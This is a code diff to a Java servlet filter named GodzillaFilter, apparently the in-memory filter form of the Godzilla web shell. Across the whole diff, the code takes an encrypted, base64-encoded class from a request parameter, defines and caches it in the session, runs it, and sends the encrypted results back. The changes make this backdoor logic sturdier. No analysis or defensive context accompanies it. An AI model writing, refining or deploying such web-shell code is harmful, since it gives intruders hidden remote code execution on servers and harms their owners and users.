@@ -36,11 +36,12 @@ public class GodzillaFilter extends ClassLoader implements Filter {
                 HttpSession session = request.getSession();
                 byte[] data = base64Decode(request.getParameter(pass));
                 data = this.x(data, false);
-                if (session.getAttribute("payload") == null) {
-                    session.setAttribute("payload", (new GodzillaFilter(Thread.currentThread().getContextClassLoader())).Q(data));
+                Object cache = session.getAttribute(key);
+                if (cache == null) {
+                    session.setAttribute(key, (new GodzillaFilter(Thread.currentThread().getContextClassLoader())).Q(data));
                 } else {
                     ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
-                    Object f = ((Class<?>) session.getAttribute("payload")).newInstance();
+                    Object f = ((Class<?>) cache).newInstance();
                     f.equals(arrOut);
                     f.equals(request);
                     f.equals(data);
@@ -49,12 +50,12 @@ public class GodzillaFilter extends ClassLoader implements Filter {
                     response.getWriter().write(base64Encode(this.x(arrOut.toByteArray(), true)));
                     response.getWriter().write(md5.substring(16));
                 }
-            } else {
-                chain.doFilter(servletRequest, servletResponse);
+                return;
             }
-        } catch (Exception e) {
-            chain.doFilter(servletRequest, servletResponse);
+        } catch (Throwable e) {
+            e.printStackTrace();
         }
+        chain.doFilter(servletRequest, servletResponse);
     }
 
     @SuppressWarnings("all")
@@ -66,18 +67,15 @@ public class GodzillaFilter extends ClassLoader implements Filter {
             Object encoder = base64.getMethod("getEncoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
             value = (String) encoder.getClass().getMethod("encodeToString", byte[].class).invoke(encoder, bs);
         } catch (Exception var6) {
-            try {
-                base64 = Class.forName("sun.misc.BASE64Encoder");
-                Object encoder = base64.newInstance();
-                value = (String) encoder.getClass().getMethod("encode", byte[].class).invoke(encoder, bs);
-            } catch (Exception ignored) {
-            }
+            base64 = Class.forName("sun.misc.BASE64Encoder");
+            Object encoder = base64.newInstance();
+            value = (String) encoder.getClass().getMethod("encode", byte[].class).invoke(encoder, bs);
         }
         return value;
     }
 
     @SuppressWarnings("all")
-    public static byte[] base64Decode(String bs) {
+    public static byte[] base64Decode(String bs) throws Exception {
         byte[] value = null;
         Class<?> base64;
         try {
@@ -85,12 +83,9 @@ public class GodzillaFilter extends ClassLoader implements Filter {
             Object decoder = base64.getMethod("getDecoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
             value = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
         } catch (Exception var6) {
-            try {
-                base64 = Class.forName("sun.misc.BASE64Decoder");
-                Object decoder = base64.newInstance();
-                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
-            } catch (Exception ignored) {
-            }
+            base64 = Class.forName("sun.misc.BASE64Decoder");
+            Object decoder = base64.newInstance();
+            value = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
         }
         return value;
     }
